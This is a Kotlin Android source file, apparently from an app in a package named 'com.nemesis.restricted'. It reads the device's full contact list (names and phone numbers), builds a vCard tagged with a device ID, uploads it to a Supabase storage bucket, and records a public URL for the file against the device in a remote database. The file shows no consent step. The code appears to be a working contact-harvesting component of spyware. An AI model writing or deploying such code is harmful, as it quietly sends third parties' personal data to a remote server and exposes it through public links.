package com.nemesis.restricted

import android.content.ContentResolver
import android.provider.ContactsContract
import android.util.Log
import io.github.jan.supabase.SupabaseClient
import io.github.jan.supabase.postgrest.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import io.github.jan.supabase.storage.*

fun fetchContacts(contentResolver: ContentResolver, deviceId: Long): String {
    val vCardBuilder = StringBuilder()
    val cursor = contentResolver.query(
        ContactsContract.Contacts.CONTENT_URI,
        null,
        null,
        null,
        null
    )

    cursor?.use {
        while (it.moveToNext()) {
            val contactId = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
            val displayName = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))

            // Append vCard header5
            vCardBuilder.append("BEGIN:VCARD\nVERSION:3.0\n")
            vCardBuilder.append("FN:[d$deviceId] $displayName\n")

            // Query for phone numbers
            val phoneCursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                arrayOf(contactId),
                null
            )
            phoneCursor?.use { phones ->
                while (phones.moveToNext()) {
                    val phoneNumber = phones.getString(phones.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                    vCardBuilder.append("TEL:$phoneNumber\n")
                }
            }

            // Append vCard footer
            vCardBuilder.append("END:VCARD\n")
        }
    }
    return vCardBuilder.toString()
}

fun uploadVCardToStorage(
    supabaseClient: SupabaseClient,
    bucketName: String,
    fileName: String,
    vCardData: String,
    deviceId: Long
) {
    CoroutineScope(Dispatchers.IO).launch {
        try {
            // Convert the vCard data to a byte array
            val byteArray = vCardData.toByteArray()


            // Access the storage bucket and upload the file
            val bucketApi = supabaseClient.storage.from(bucketName)
            bucketApi.upload(fileName, byteArray) {
                upsert = false
            }

            // Generate the public URL for the uploaded file
            val publicUrl = bucketApi.publicUrl(fileName)
            val client = SupabaseClientManager.supabase;
            client.from("devices").update(
                {
                    set("contactList", publicUrl)
                }
            ) {
                filter {
                    eq("id", deviceId)
                }
            }
            withContext(Dispatchers.Main) {
                Log.d("Supabase return","File uploaded successfully. Public URL: $publicUrl")
            }
        } catch (e: Exception) {
            Log.e("Supabase error", "Error:" + e.message)
        }
    }
}